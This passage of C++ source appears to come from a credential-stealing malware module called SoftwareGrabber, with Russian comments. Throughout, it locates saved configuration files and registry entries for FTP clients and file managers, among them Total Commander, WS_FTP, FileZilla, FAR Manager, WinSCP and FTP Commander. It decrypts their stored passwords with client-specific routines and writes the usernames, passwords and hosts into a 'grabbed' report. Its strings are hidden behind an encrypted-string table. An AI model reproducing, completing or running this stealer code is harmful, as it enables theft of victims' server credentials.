      Fs::_findFiles(curPath, dirs, sizeof(dirs) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FOLDERS, ftpFlashFxp3Proc, &ftpData, NULL, 0, 0);
    }
  }

  if(ftpData.count > 0)writeReport(ftpData.list, CryptedStrings::id_softwaregrabber_flashfxp_title, BLT_GRABBED_FTPSOFTWARE);
  else Mem::free(ftpData.list);
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// CuteFTP
////////////////////////////////////////////////////////////////////////////////////////////////////
#if(0)
/*
  Декруптор пароля.

  IN OUT pass    - пароль.
  IN sectionName - имя секции. Не может быть нулевой.

  Return         - размер пароля.
*/
static int ftpCuteFtpDecrypt(LPWSTR pass, LPWSTR sectionName)
{
  BYTE buf[MAX_ITEM_SIZE];
  LPWSTR magic;
  int magicLen;
  int r = 0;
  
  if(Str::_findCharW(sectionName, 0x03))
  {
    magicLen = Str::_LengthW(sectionName);
    magic    = sectionName;
  }
  else
  {
    magic = L"yA36zA48dEhfrvghGRg57h5UlDv3";
    magicLen = 28;
  }

  int len = Str::_LengthW(pass) / 2;
  if(len < MAX_ITEM_SIZE && Str::_fromHexW(pass, buf))
  {
    len--;

    int i = 0, j = 0;
    for(; i < len; i++, j++)
    {
      if(j == magicLen)j = 0;

      BYTE c = buf[i + 1] ^ ((BYTE)(magic[j]));
      if(c < buf[i])c--;
      pass[i] = (WCHAR)(BYTE)(c - buf[i]);
    }
    pass[i] = 0;
    r = i;
  }
  return r;
}


bool ftpCuteFtpProc(LPWSTR path, WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
*/
static void ftpCuteFtpBasicSearch(LPWSTR path, FTPDATA *ftpData)
{
  const LPWSTR files[] = {L"sm.dat", L"tree.dat", L"smdata.dat"};
  Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | Fs::FFFLAG_RECURSIVE, ftpCuteFtpProc, ftpData, NULL, 0, 0);
}

static bool ftpCuteFtpProc(LPWSTR path, WIN32_FIND_DATAW *fileInfo, void *data)
{
  FTPDATA *ftpData = (FTPDATA *)data;
  WCHAR curPath[MAX_PATH];

  if(Fs::_pathCombine(curPath, path, fileInfo->cFileName))
  {
    WDEBUG1(WDDT_INFO, "%s", curPath);
    if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)ftpCuteFtpBasicSearch(curPath, ftpData);
    else
    {      
      Fs::MEMFILE mf;
      if(Fs::_fileToMem(curPath, &mf, Fs::FTOMF_SHARE_WRITE))
      {
        LPBYTE data    = mf.pData;
        LPBYTE dataEnd = data + mf.dwSize;
        
        //FIXME: Бинарные данные в неизвестном формате.

        Fs::_closeMemFile(&mf);
      }
    }
  }
  return true;
}

void SoftwareGrabber::_ftpCuteFtp(void)
{
  char text[8192];
  char epass[4096];
  char buf[3][32 * 1024];

  const DWORD locs[] = {CSIDL_PROGRAM_FILES, CSIDL_APPDATA, CSIDL_COMMON_APPDATA};
  const LPWSTR dirs[] = {L"*globalscape*"};
  WCHAR curPath[MAX_PATH];
  FTPDATA ftpData;

  Mem::_zero(&ftpData, sizeof(FTPDATA));

  for(DWORD i = 0; i < sizeof(locs) / sizeof(DWORD); i++)if(CWA(shell32, SHGetFolderPathW)(NULL, locs[i], NULL, SHGFP_TYPE_CURRENT, curPath) == S_OK) 
  {
    Fs::_findFiles(curPath, dirs, sizeof(dirs) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FOLDERS, ftpCuteFtpProc, &ftpData, NULL, 0, 0);
  }

  if(ftpData.count > 0)
  {
    //FIXME: writeReport(ftpData.list, CryptedStrings::id_softwaregrabber_flashfxp_title, BLT_GRABBED_FTPSOFTWARE);
    WDEBUG1(WDDT_INFO, "CuteFTP:\n%s", ftpData.list);
    Report::writeString(BLT_GRABBED_FTPSOFTWARE, L"CuteFTP", NULL, ftpData.list);
  }

  Mem::free(ftpData.list);
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////
// Total Commander
////////////////////////////////////////////////////////////////////////////////////////////////////

static unsigned long randTotalCommander(unsigned long *seed, unsigned long val)
{
  *seed = (*seed * 0x8088405) + 1;
  return Math::_shr64(Math::_mul64(*seed, val), 32);
}  

/*
  Декруптор пароля.

  IN OUT pass    - пароль.

  Return         - размер пароля.
*/
static int ftpTotalCommanderDecrypt(LPWSTR pass)
{
  BYTE buf[MAX_ITEM_SIZE];
  int len = Str::_LengthW(pass) / 2;
  
  if(len < MAX_ITEM_SIZE && Str::_fromHexW(pass, buf))
  {
    len -= 4;
    unsigned long seed = 0x0CF671;

    for(int i = 0; i < len; i++)
    {
      int val = (char)randTotalCommander(&seed, 8);
      buf[i] = (buf[i] >> (8 - val)) | (buf[i] << val);
    }
  
    seed = 0x3039;
    for(int i = 0; i < 0x100; i++)
    {
      int val  = (char)randTotalCommander(&seed, len);
      int temp = (char)randTotalCommander(&seed, len);
      char sw = buf[val];
      buf[val] = buf[temp];
      buf[temp] = sw;
    }
  
    seed = 0xA564;
    for(int i = 0; i < len; i++)buf[i] ^= (char)randTotalCommander(&seed, 0x100);

    seed = 0xD431;
    for(int i = 0; i < len; i++)buf[i] -= (char)randTotalCommander(&seed, 0x100);

    for(int i = 0; i < len; i++)pass[i] = buf[i];
    pass[len] = 0;

    return len;
  }

  return 0;
}

bool ftpTotalCommanderProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
  IN recrusive   - рекрусивный поиск.
*/
static void ftpTotalCommanderBasicSearch(LPWSTR path, FTPDATA *ftpData, bool recrusive)
{
  CSTR_GETW(file1, softwaregrabber_tc_file_1);
  const LPWSTR files[] = {file1};
  Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | (recrusive ? Fs::FFFLAG_RECURSIVE : 0), ftpTotalCommanderProc, ftpData, NULL, 0, 0);
}

static void ftpTotalCommanderReadIni(LPWSTR curPath, FTPDATA *ftpData)
{
  LPWSTR sectionsList = (LPWSTR)Mem::alloc(0xFFFF * sizeof(WCHAR));
  if(sectionsList != NULL)
  {
    DWORD size = CWA(kernel32, GetPrivateProfileStringW)(NULL, NULL, NULL, sectionsList, 0xFFFF, curPath);
    if(size > 0 && Str::_isValidMultiStringW(sectionsList, size + 1))
    {
      const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 10;
      LPWSTR dataBuf = (LPWSTR)Mem::alloc(MAX_ITEM_SIZE * 3 * sizeof(WCHAR) + maxLogSize * sizeof(WCHAR));
      if(dataBuf != NULL)
      {
        LPWSTR host    = dataBuf;
        LPWSTR user    = host + MAX_ITEM_SIZE;
        LPWSTR pass    = user + MAX_ITEM_SIZE;
        LPWSTR output  = pass + MAX_ITEM_SIZE;
        LPWSTR section = sectionsList;

        CSTR_GETW(badSection1, softwaregrabber_tc_section_bad_1);
        CSTR_GETW(badSection2, softwaregrabber_tc_section_bad_2);
        CSTR_GETW(keyHost,     softwaregrabber_tc_host);
        CSTR_GETW(keyUser,     softwaregrabber_tc_user);
        CSTR_GETW(keyPass,     softwaregrabber_tc_pass);
        
        do if(CWA(shlwapi, StrStrIW)(section, badSection1) == NULL && CWA(shlwapi, StrStrIW)(section, badSection2) == NULL)
        {
          if(CWA(kernel32, GetPrivateProfileStringW)(section, keyHost, NULL, host, MAX_ITEM_SIZE, curPath) > 0 &&
             CWA(kernel32, GetPrivateProfileStringW)(section, keyUser, NULL, user, MAX_ITEM_SIZE, curPath) > 0 &&
             CWA(kernel32, GetPrivateProfileStringW)(section, keyPass, NULL, pass, MAX_ITEM_SIZE, curPath) > 0 &&
             ftpTotalCommanderDecrypt(pass) > 0)
          {
            CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format2W);
            int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host);
            if(outputSize > 0 && Str::_CatExW(&ftpData->list, output, outputSize))ftpData->count++;
          }
        }
        while((section = Str::_multiStringGetIndexW(section, 1)) != NULL);
        Mem::free(dataBuf);
      }
    }
    Mem::free(sectionsList);
  }
}

static bool ftpTotalCommanderProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
  FTPDATA *ftpData = (FTPDATA *)data;
  WCHAR curPath[MAX_PATH];

  if(Fs::_pathCombine(curPath, path, (LPWSTR)fileInfo->cFileName))
  {
    WDEBUG1(WDDT_INFO, "%s", curPath);
    if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)ftpTotalCommanderBasicSearch(curPath, ftpData, true);
    else ftpTotalCommanderReadIni(curPath, ftpData);
  }
  return true;
}

void SoftwareGrabber::_ftpTotalCommander(void)
{
  WCHAR curPath[MAX_PATH];
  WCHAR dataPath[MAX_PATH];
  DWORD size;
  FTPDATA ftpData;

  Mem::_zero(&ftpData, sizeof(FTPDATA));

  CSTR_GETW(regKey, softwaregrabber_tc_regkey);
  CSTR_GETW(regValue, softwaregrabber_tc_regvalue_ftp);
  if((size = Registry::_getValueAsString(HKEY_CURRENT_USER, regKey, regValue, curPath, MAX_PATH)) != (DWORD)-1 && size > 0)
  {
    CWA(kernel32, ExpandEnvironmentStringsW)(curPath, dataPath, MAX_PATH);
    ftpTotalCommanderReadIni(dataPath, &ftpData);
    CWA(shlwapi, PathRemoveFileSpecW)(dataPath);
  }

  if(ftpData.count == 0)
  {
    CSTR_GETW(dir1, softwaregrabber_tc_path_mask_1);
    CSTR_GETW(dir2, softwaregrabber_tc_path_mask_2);
    CSTR_GETW(dir3, softwaregrabber_tc_path_mask_3);
    const DWORD locs[] = {CSIDL_WINDOWS, CSIDL_APPDATA, CSIDL_PROGRAM_FILES, CSIDL_COMMON_APPDATA};
    const LPWSTR dirs[] = {dir1, dir2, dir3};

    for(DWORD i = 0; i < sizeof(locs) / sizeof(DWORD); i++)if(CWA(shell32, SHGetFolderPathW)(NULL, locs[i], NULL, SHGFP_TYPE_CURRENT, curPath) == S_OK) 
    {
      if(locs[i] == CSIDL_WINDOWS)
      {
        ftpTotalCommanderBasicSearch(curPath, &ftpData, false);
        curPath[3] = 0;
      }
      Fs::_findFiles(curPath, dirs, sizeof(dirs) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FOLDERS, ftpTotalCommanderProc, &ftpData, NULL, 0, 0);
    }
  }

  if(ftpData.count == 0)
  {
    CSTR_GETW(regKey, softwaregrabber_tc_regkey);
    CSTR_GETW(regValue, softwaregrabber_tc_regvalue_dir);
    if((size = Registry::_getValueAsString(HKEY_CURRENT_USER, regKey, regValue, curPath, MAX_PATH)) != (DWORD)-1 && size > 0)
    {
      CWA(kernel32, ExpandEnvironmentStringsW)(curPath, dataPath, MAX_PATH);
      ftpTotalCommanderBasicSearch(dataPath, &ftpData, true);
    }
  }
  
  if(ftpData.count > 0)writeReport(ftpData.list, CryptedStrings::id_softwaregrabber_tc_title, BLT_GRABBED_FTPSOFTWARE);
  else Mem::free(ftpData.list);
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// WS_FTP
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Декруптор пароля.

  IN OUT pass    - пароль.

  Return         - размер пароля.
*/
static int ftpWsFtpDecrypt(LPWSTR pass)
{
  //FIXME: Узнать алгоритм.
  return Str::_LengthW(pass);
}

bool ftpWsFtpProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
  IN recrusive   - рекрусивный поиск.
*/
static void ftpWsFtpBasicSearch(LPWSTR path, FTPDATA *ftpData)
{
  CSTR_GETW(file1, softwaregrabber_wsftp_file_1);
  const LPWSTR files[] = {file1};
  Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | Fs::FFFLAG_RECURSIVE, ftpWsFtpProc, ftpData, NULL, 0, 0);
}

static bool ftpWsFtpProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
  FTPDATA *ftpData = (FTPDATA *)data;
  WCHAR curPath[MAX_PATH];

  if(Fs::_pathCombine(curPath, path, (LPWSTR)fileInfo->cFileName))
  {
    WDEBUG1(WDDT_INFO, "%s", curPath);
    if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)ftpWsFtpBasicSearch(curPath, ftpData);
    else
    {      
      LPWSTR sectionsList = (LPWSTR)Mem::alloc(0xFFFF * sizeof(WCHAR));
      if(sectionsList != NULL)
      {
        DWORD size = CWA(kernel32, GetPrivateProfileStringW)(NULL, NULL, NULL, sectionsList, 0xFFFF, curPath);
        if(size > 0 && Str::_isValidMultiStringW(sectionsList, size + 1))
        {
          const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 20;
          LPWSTR dataBuf = (LPWSTR)Mem::alloc(MAX_ITEM_SIZE * 3 * sizeof(WCHAR) + maxLogSize * sizeof(WCHAR));
          if(dataBuf != NULL)
          {
            LPWSTR host    = dataBuf;
            LPWSTR user    = host + MAX_ITEM_SIZE;
            LPWSTR pass    = user + MAX_ITEM_SIZE;
            LPWSTR output  = pass + MAX_ITEM_SIZE;
            LPWSTR section = sectionsList;
            DWORD port;
            
            CSTR_GETW(badSection, softwaregrabber_wsftp_section_bad_1);
            CSTR_GETW(keyHost, softwaregrabber_wsftp_host);
            CSTR_GETW(keyPort, softwaregrabber_wsftp_port);
            CSTR_GETW(keyUser, softwaregrabber_wsftp_user);
            CSTR_GETW(keyPass, softwaregrabber_wsftp_pass);
            
            do if(CWA(shlwapi, StrStrIW)(section, badSection) == NULL)
            {
              if(CWA(kernel32, GetPrivateProfileStringW)(section, keyHost, NULL, host, MAX_ITEM_SIZE, curPath) > 0 &&
                 (port = CWA(kernel32, GetPrivateProfileIntW)(section, keyPort, 21, curPath)) > 0 && port <= 0xFFFF &&
                 CWA(kernel32, GetPrivateProfileStringW)(section, keyUser, NULL, user, MAX_ITEM_SIZE, curPath) > 0 &&
                 CWA(kernel32, GetPrivateProfileStringW)(section, keyPass, NULL, pass, MAX_ITEM_SIZE, curPath) > 0 &&
                 ftpWsFtpDecrypt(pass) > 0)
              {
                CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1W);
                int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host, port);
                if(outputSize > 0 && Str::_CatExW(&ftpData->list, output, outputSize))ftpData->count++;
              }
            }
            while((section = Str::_multiStringGetIndexW(section, 1)) != NULL);
            Mem::free(dataBuf);
          }
        }
        Mem::free(sectionsList);
      }
    }
  }
  return true;
}

void SoftwareGrabber::_ftpWsFtp(void)
{
  WCHAR curPath[MAX_PATH];
  WCHAR dataPath[MAX_PATH];
  DWORD size;
  FTPDATA ftpData;

  Mem::_zero(&ftpData, sizeof(FTPDATA));

  CSTR_GETW(regKey, softwaregrabber_wsftp_regkey);
  CSTR_GETW(regValue, softwaregrabber_wsftp_regvalue);
  if((size = Registry::_getValueAsString(HKEY_CURRENT_USER, regKey, regValue, curPath, MAX_PATH)) != (DWORD)-1 && size > 0)
  {
    CWA(kernel32, ExpandEnvironmentStringsW)(curPath, dataPath, MAX_PATH);
    ftpWsFtpBasicSearch(dataPath, &ftpData);
  }

  if(ftpData.count == 0)
  {
    CSTR_GETW(dir1, softwaregrabber_wsftp_path_mask_1);
    const DWORD locs[] = {CSIDL_APPDATA, CSIDL_PROGRAM_FILES, CSIDL_COMMON_APPDATA};
    const LPWSTR dirs[] = {dir1};

    for(DWORD i = 0; i < sizeof(locs) / sizeof(DWORD); i++)if(CWA(shell32, SHGetFolderPathW)(NULL, locs[i], NULL, SHGFP_TYPE_CURRENT, curPath) == S_OK) 
    {
      Fs::_findFiles(curPath, dirs, sizeof(dirs) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FOLDERS, ftpWsFtpProc, &ftpData, NULL, 0, 0);
    }
  }
  
  if(ftpData.count > 0)writeReport(ftpData.list, CryptedStrings::id_softwaregrabber_wsftp_title, BLT_GRABBED_FTPSOFTWARE);
  else Mem::free(ftpData.list);
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// FileZilla
////////////////////////////////////////////////////////////////////////////////////////////////////

bool ftpFileZillaProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
*/
static void ftpFileZillaBasicSearch(LPWSTR path, FTPDATA *ftpData)
{
  CSTR_GETW(file1, softwaregrabber_filezilla_file_mask_1);
  const LPWSTR files[] = {file1};
  Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | Fs::FFFLAG_RECURSIVE, ftpFileZillaProc, ftpData, NULL, 0, 0);
}

static bool ftpFileZillaProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
  FTPDATA *ftpData = (FTPDATA *)data;
  WCHAR curPath[MAX_PATH];

  if(Fs::_pathCombine(curPath, path, (LPWSTR)fileInfo->cFileName))
  {
    WDEBUG1(WDDT_INFO, "%s", curPath);
    if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)ftpFileZillaBasicSearch(curPath, ftpData);
    else
    {      
      IXMLDOMDocument *doc = XmlParser::_openFile(curPath, NULL);
      if(doc != NULL)
      {
        CSTR_GETW(nodeMask, softwaregrabber_filezilla_node_mask);
        IXMLDOMNodeList *list;
        if(doc->selectNodes(nodeMask, &list) == S_OK)
        {
          IXMLDOMNode *curNode;
          while(list->nextNode(&curNode) == S_OK)
          {
            BSTR host;
            BSTR port;
            BSTR user;
            BSTR pass;

            {
              CSTR_GETW(nodeHost, softwaregrabber_filezilla_host);
              host = XmlParser::_getNodeTextOfNode(curNode, nodeHost);
            }
            {
              CSTR_GETW(nodePort, softwaregrabber_filezilla_port);
              port = XmlParser::_getNodeTextOfNode(curNode, nodePort);
            }
            {
              CSTR_GETW(nodeUser, softwaregrabber_filezilla_user);
              user = XmlParser::_getNodeTextOfNode(curNode, nodeUser);
            }
            {
              CSTR_GETW(nodePass, softwaregrabber_filezilla_pass);
              pass = XmlParser::_getNodeTextOfNode(curNode, nodePass);
            }

            if(host != NULL && *host != 0 && user != NULL && *user != 0 && pass != NULL && *pass != 0)
            {
              DWORD portInt = port != NULL ? Str::_ToInt32W(port, NULL) : 0;
              if(portInt < 1 || portInt > 0xFFFF)portInt = 21;

              LPWSTR output = NULL;
              CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1W);
              int outputSize = Str::_sprintfExW(&output, reportFormat, user, pass, host, portInt);
              if(outputSize > 0 && Str::_CatExW(&ftpData->list, output, outputSize))ftpData->count++;
              Mem::free(output);
            }

            XmlParser::_freeBstr(host);
            XmlParser::_freeBstr(port);
            XmlParser::_freeBstr(user);
            XmlParser::_freeBstr(pass);
            curNode->Release();
          }
          list->Release();
        }
        doc->Release();
      }
    }
  }
  return true;
}

void SoftwareGrabber::_ftpFileZilla(void)
{
  CSTR_GETW(dir1, softwaregrabber_filezilla_path_mask_1);
  const DWORD locs[] = {CSIDL_PROGRAM_FILES, CSIDL_APPDATA, CSIDL_COMMON_APPDATA};
  const LPWSTR dirs[] = {dir1};
  WCHAR curPath[MAX_PATH];
  FTPDATA ftpData;

  Mem::_zero(&ftpData, sizeof(FTPDATA));

  for(DWORD i = 0; i < sizeof(locs) / sizeof(DWORD); i++)if(CWA(shell32, SHGetFolderPathW)(NULL, locs[i], NULL, SHGFP_TYPE_CURRENT, curPath) == S_OK) 
  {
    Fs::_findFiles(curPath, dirs, sizeof(dirs) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FOLDERS, ftpFileZillaProc, &ftpData, NULL, 0, 0);
  }

  if(ftpData.count > 0)writeReport(ftpData.list, CryptedStrings::id_softwaregrabber_filezilla_title, BLT_GRABBED_FTPSOFTWARE);
  else Mem::free(ftpData.list);
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// FAR Manager
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Декруптор пароля.

  IN OUT pass    - пароль. Буфер должен иметь размер не менее MAX_ITEM_SIZE.

  Return         - размер пароля.
*/
static int ftpFarManagerDecrypt(LPWSTR pass)
{
  BYTE epass[MAX_ITEM_SIZE];
  Mem::_copy(epass, pass, MAX_ITEM_SIZE);
  epass[MAX_ITEM_SIZE - 1] = 0;

  BYTE val = (epass[0] ^ epass[1]) | 0x50;
  int i = 2, j = 0;
  
  for(; epass[i] != 0; i++, j++)pass[j] = epass[i] ^ val;
  pass[j] = 0;
  return j;
}

void SoftwareGrabber::_ftpFarManager(void)
{
  const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 10;
  LPWSTR dataBuf = (LPWSTR)Mem::alloc(MAX_ITEM_SIZE * 3 * sizeof(WCHAR) + maxLogSize * sizeof(WCHAR));

  if(dataBuf != NULL)
  {
    CSTR_GETW(regKey1, softwaregrabber_far_regkey_1);
    CSTR_GETW(regKey2, softwaregrabber_far_regkey_2);

    HKEY rootKey;
    WCHAR name[MAX_PATH];
    const LPWSTR locs[] = {regKey1, regKey2};
    FTPDATA ftpData;

    Mem::_zero(&ftpData, sizeof(FTPDATA));

    CSTR_GETW(regHost,  softwaregrabber_far_host);
    CSTR_GETW(regUser1, softwaregrabber_far_user_1);
    CSTR_GETW(regUser2, softwaregrabber_far_user_2);
    CSTR_GETW(regPass,  softwaregrabber_far_pass);
    
    LPWSTR host    = dataBuf;
    LPWSTR user    = host + MAX_ITEM_SIZE;
    LPWSTR pass    = user + MAX_ITEM_SIZE;
    LPWSTR output  = pass + MAX_ITEM_SIZE;

    for(DWORD i = 0; i < sizeof(locs) / sizeof(LPWSTR); i++)if(CWA(advapi32, RegOpenKeyExW)(HKEY_CURRENT_USER, locs[i], 0, KEY_ENUMERATE_SUB_KEYS, &rootKey) == ERROR_SUCCESS)
    {
      DWORD index = 0;
      DWORD size = MAX_PATH;

      while(CWA(advapi32, RegEnumKeyExW)(rootKey, index++, name, &size, 0, NULL, NULL, NULL) == ERROR_SUCCESS)
      {
        if((size = Registry::_getValueAsString(rootKey, name, regHost, host, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0 &&
           (
            ((size = Registry::_getValueAsString(rootKey, name, regUser1, user, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0) ||
            ((size = Registry::_getValueAsString(rootKey, name, regUser2,     user, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0)
           ) &&
           (size = Registry::_getValueAsBinary(rootKey, name, regPass, NULL, pass, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0 &&
           ftpFarManagerDecrypt(pass) > 0)
        {
          CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format2W);
          int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host);
          if(outputSize > 0 && Str::_CatExW(&ftpData.list, output, outputSize))ftpData.count++;
        }
        size = MAX_PATH;
      }
      CWA(advapi32, RegCloseKey)(rootKey);
    }
    
    Mem::free(dataBuf);

    if(ftpData.count > 0)writeReport(ftpData.list, CryptedStrings::id_softwaregrabber_far_title, BLT_GRABBED_FTPSOFTWARE);
    else Mem::free(ftpData.list);
  }
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// WinSCP
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Декруптор пароля.

  IN OUT pass        - пароль.
  IN hostAndUserSize - сумма длин пароля и имени.

  Return             - размер пароля.
*/
static int ftpWinScpDecrypt(LPWSTR pass, int hostAndUserSize)
{
  BYTE buf[MAX_ITEM_SIZE];
  int len = Str::_LengthW(pass) / 2;
  if(len < MAX_ITEM_SIZE && Str::_fromHexW(pass, buf))
  {
    for(int i = 0; i < len; i++)buf[i] ^= 0x5C;
    
    LPBYTE pos = buf;
    BYTE elen;
    
    if(buf[0] == 0xFF)
    {
      elen = buf[2];
      pos += 3;
    }
    else
    {
      elen = buf[0];
      pos += 1;
    }
    pos += pos[0] + 1;
    
    if(pos + elen <= &buf[len] && elen >= hostAndUserSize)
    {
      if(buf[0] == 0xFF)
      {
        pos += hostAndUserSize;
        elen -= hostAndUserSize;
      }
      
      for(int i = 0; i < elen; i++)pass[i] = pos[i];
      pass[elen] = 0;
      
      return elen;
    }
  }

  return 0;
}

void SoftwareGrabber::_ftpWinScp(void)
{
  FTPDATA ftpData;
  Mem::_zero(&ftpData, sizeof(FTPDATA));

  const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 20;
  LPWSTR dataBuf = (LPWSTR)Mem::alloc(MAX_ITEM_SIZE * 3 * sizeof(WCHAR) + maxLogSize * sizeof(WCHAR));

  if(dataBuf != NULL)
  {
    HKEY rootKey;
    WCHAR name[MAX_PATH];
    const HKEY locs[] = {HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};

    LPWSTR host    = dataBuf;
    LPWSTR user    = host + MAX_ITEM_SIZE;
    LPWSTR pass    = user + MAX_ITEM_SIZE;
    LPWSTR output  = pass + MAX_ITEM_SIZE;

    CSTR_GETW(regKey,  softwaregrabber_winscp_regkey);
    CSTR_GETW(regHost, softwaregrabber_winscp_host);
    CSTR_GETW(regPort, softwaregrabber_winscp_port);
    CSTR_GETW(regUser, softwaregrabber_winscp_user);
    CSTR_GETW(regPass, softwaregrabber_winscp_pass);
    for(DWORD i = 0; i < sizeof(locs) / sizeof(HKEY); i++)if(CWA(advapi32, RegOpenKeyExW)(locs[i], regKey, 0, KEY_ENUMERATE_SUB_KEYS, &rootKey) == ERROR_SUCCESS)
    {
      DWORD index = 0;
      DWORD size = MAX_PATH;
      DWORD userSize;
      DWORD hostSize;
      DWORD port;

      while(CWA(advapi32, RegEnumKeyExW)(rootKey, index++, name, &size, 0, NULL, NULL, NULL) == ERROR_SUCCESS)
      {
        if((hostSize = Registry::_getValueAsString(rootKey, name, regHost, host, MAX_ITEM_SIZE)) != (DWORD)-1 && hostSize > 0 &&
           (userSize = Registry::_getValueAsString(rootKey, name, regUser, user, MAX_ITEM_SIZE)) != (DWORD)-1 && userSize > 0 &&
           (size = Registry::_getValueAsString(rootKey, name, regPass, pass, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0 &&
           ftpWinScpDecrypt(pass, hostSize + userSize) > 0)
        {
          port = Registry::_getValueAsDword(rootKey, name, regPort);
          if(port < 1 || port > 0xFFFF)port = 21;
          CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1W);
          int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host, port);
          if(outputSize > 0 && Str::_CatExW(&ftpData.list, output, outputSize))ftpData.count++;
        }
        size = MAX_PATH;
      }
      CWA(advapi32, RegCloseKey)(rootKey);
    }
  
    Mem::free(dataBuf);
  }

  //FIXME: winscp.ini
  
  if(ftpData.count > 0)writeReport(ftpData.list, CryptedStrings::id_softwaregrabber_winscp_title, BLT_GRABBED_FTPSOFTWARE);
  else Mem::free(ftpData.list);
}


////////////////////////////////////////////////////////////////////////////////////////////////////
// FTP Commander
////////////////////////////////////////////////////////////////////////////////////////////////////

void ftpFtpCommanderMarkStringEnd(LPSTR string)
{
  LPSTR end = Str::_findCharA(string, ';');
  //Т.к. автор клиента идиот, это более менее сохранит данные верными.
  if(end != NULL)
  {
    while(end[1] == ';')end++; 
    *end = 0;
  }
}

/*
  Декруптор пароля.

  IN OUT pass    - пароль.

  Return         - размер пароля.
*/
static int ftpFtpCommanderDecrypt(LPSTR pass)
{
  //Автор клиента идиот.
  if((pass[0] == '0' || pass[0] == '1') && pass[1] == 0)return 0;
  
  int i = 0;
  for(; pass[i] != 0; i++)pass[i] ^= 0x19;
  return i;
}

bool ftpFtpCommanderProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
*/
static void ftpFtpCommanderBasicSearch(LPWSTR path, FTPDATA *ftpData)
{
  CSTR_GETW(file1, softwaregrabber_fc_file_1);
  const LPWSTR files[] = {file1};
  Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | Fs::FFFLAG_RECURSIVE, ftpFtpCommanderProc, ftpData, NULL, 0, 0);
}

static bool ftpFtpCommanderProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
  FTPDATA *ftpData = (FTPDATA *)data;
  WCHAR curPath[MAX_PATH];

  if(Fs::_pathCombine(curPath, path, (LPWSTR)fileInfo->cFileName))
  {
    WDEBUG1(WDDT_INFO, "%s", curPath);
    if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)ftpFtpCommanderBasicSearch(curPath, ftpData);
    else
    {      
      Fs::MEMFILE mf;
      if(Fs::_fileToMem(curPath, &mf, Fs::FTOMF_SHARE_WRITE))
      {
        LPBYTE data    = mf.data;
        LPBYTE dataEnd = data + mf.size;
        LPSTR *list;
        DWORD listSize = Str::_splitToStringsA((LPSTR)mf.data, mf.size, &list, Str::STS_TRIM, 0);
        
        if(listSize != (DWORD)-1)
        {
          const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 20;
          LPWSTR output = (LPWSTR)Mem::alloc(maxLogSize * sizeof(WCHAR));

          CSTR_GETA(valueHost, softwaregrabber_fc_host);
          CSTR_GETA(valuePort, softwaregrabber_fc_port);
          CSTR_GETA(valueUser, softwaregrabber_fc_user);
          CSTR_GETA(valuePass, softwaregrabber_fc_pass);
          if(output != NULL)for(DWORD i = 0; i < listSize; i++)if(list[i] != NULL)
          {
            LPSTR host = CWA(shlwapi, StrStrIA)(list[i], valueHost);
